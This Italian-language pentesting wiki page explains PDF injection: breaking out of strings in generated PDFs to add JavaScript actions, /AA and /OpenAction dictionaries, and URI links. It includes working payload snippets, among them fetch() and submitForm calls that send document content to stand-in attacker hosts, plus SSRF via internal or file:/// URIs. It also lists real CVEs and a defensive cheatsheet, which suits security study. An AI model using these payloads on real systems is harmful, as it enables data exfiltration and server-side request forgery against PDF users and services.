# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**Se il tuo input viene riflesso all'interno di un file PDF, puoi provare a iniettare dati PDF per eseguire JavaScript, effettuare SSRF o rubare il contenuto del PDF.**
PDF syntax è estremamente permissiva – se riesci a uscire dalla stringa o dal dizionario che sta incorporando il tuo input puoi aggiungere nuovi oggetti (o nuove chiavi nello stesso oggetto) che Acrobat/Chrome parseranno senza problemi.
Dal 2024 un'ondata di segnalazioni bug-bounty ha dimostrato che *una parentesi non escapeata o un back-slash è sufficiente* per l'esecuzione completa di uno script.

## TL;DR – Workflow d'attacco moderno (2024–2026)
1. Trova qualsiasi valore controllato dall'utente che finisca all'interno di una **(parenthesis string)**, `/URI ( … )` o `/JS ( … )` field nel PDF generato.
2. Inietta `) ` (chiudendo la stringa) seguito da uno dei primitivi qui sotto e termina con un'altra parentesi aperta per mantenere la sintassi valida.
3. Consegna il PDF malevolo a una vittima (o a un servizio backend che renderizza automaticamente il file – ottimo per blind bugs).
4. Il tuo payload viene eseguito nel PDF viewer:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (see CVE-2024-4367)
* Acrobat → Full JavaScript API (can exfiltrate arbitrary file contents with `this.getPageNthWord`)

Example (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*La prima `)` chiude la stringa URI originale, quindi aggiungiamo un nuovo dizionario **Action** che Acrobat eseguirà quando l'utente clicca il link.*

## Primitive utili per l'injection
| Obiettivo | Payload Snippet | Note |
|------|-----------------|-------|
| **JavaScript on open** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Si esegue immediatamente quando il documento viene aperto (funziona in Acrobat, non in Chrome). |
| **JavaScript on link** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Funziona in PDFium & Acrobat se controlli un'annotazione `/Link`. |
| **Blind data exfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Combina con `this.getPageNthWord` all'interno di JS per rubare contenuto. |
| **Server-Side SSRF** | Same as above but target an internal URL – great when the PDF is rendered by back-office services that honour `/URI`. | Stesso discorso ma mira a un URL interno – ottimo quando il PDF viene reso da servizi back-office che rispettano `/URI`. |
| **Additional Actions (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | Allegalo a un dizionario Page/Annotation/Form per eseguirlo all'apertura o al focus. |
| **Line Break for new objects** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | Se la libreria ti permette di iniettare caratteri di nuova linea puoi creare oggetti totalmente nuovi. |

## Azioni incorporate come bersagli di injection
I PDF viewer trattano le **embedded actions** come `/OpenAction` e `/AA` (Additional Actions) come funzionalità di prima classe che possono essere eseguite quando un documento si apre o quando si verifica un evento specifico. Se puoi iniettare in qualsiasi dizionario che accetti actions (Catalog, Page, Annotation, o Form field), puoi innestare un albero `/AA` e attivare JavaScript all'apertura o al focus.

Esempio di payload per **generator-side object injection** (chiudi la stringa/dizionario originale e inietta `/AA`):
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
Questo pattern corrisponde a problemi recenti di jsPDF in cui input controllato dall'attaccante passato a `addJS` (o a certi campi AcroForm) esce dalla stringa JavaScript prevista e inietta un dizionario **Additional Action**.

## Trucco di enumerazione cieca
Gareth Heyes (PortSwigger) ha pubblicato un one-liner che elenca ogni oggetto all'interno di un documento sconosciuto – utile quando non puoi vedere il PDF generato:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
Il codice itera il DOM di Acrobat ed esegue richieste in uscita per ogni coppia proprietà/valore, fornendoti un dump *JSON-ish* del file.
Vedi il white-paper “Portable Data **ex**Filtration” per la tecnica completa.

## Bug nel mondo reale (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` PDF object injection: stringhe controllate dall'attaccante possono chiudere il literal JS e iniettare `/AA` → `/O` → `/JavaScript` actions che si attivano all'apertura/focus.
* **CVE-2024-4367** – Arbitrary JavaScript execution in Firefox’s PDF.js prior to 4.2.67 ha bypassato il sandbox con una crafted `/JavaScript` action.
* **Bug bounty 2024-05** – Una major fintech ha accettato note fattura fornite dal cliente che finivano in `/URI`; il report è stato pagato $10k dopo aver dimostrato SSRF verso un host di metadata interno usando URI `file:///`.
* **CVE-2023-26155** – `node-qpdf` command-injection via unsanitised PDF path mostra l'importanza di eseguire l'escape di backslashes e parentesi anche *prima* del livello PDF.

## Cheatsheet difensivo
1. **Non concatenare mai input utente grezzo** all'interno di stringhe o nomi `(`…`)`. Escapa `\`, `(`, `)` come richiesto da §7.3 della PDF spec o usa hex strings `<...>`.
2. Se costruisci link, preferisci `/URI (https://…)` che *URL-encode* completamente; blocca gli schemi `javascript:` nei viewer client.
3. Rimuovi o valida i dizionari `/OpenAction`, `/AA` (additional actions), `/Launch`, `/SubmitForm` e `/ImportData` durante il post-processing dei PDF.
4. Dal lato server, renderizza i PDF non fidati con un *headless converter* (es. qpdf –decrypt –linearize) che rimuove JavaScript e azioni esterne.
5. Mantieni i viewer PDF aggiornati; PDF.js < 4.2.67 e Acrobat Reader prima delle patch di luglio 2024 permettono esecuzione di codice banale.
6. Se usi generatori client-side (es. jsPDF), non passare mai input non fidato in `addJS` o setter AcroForm che finiscono dentro i dizionari di action del PDF.

## Riferimenti
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (aggiornato Mag 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (Aprile 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (Febbraio 2026). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (Set 2025) – embedded actions like OpenAction/AA. <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
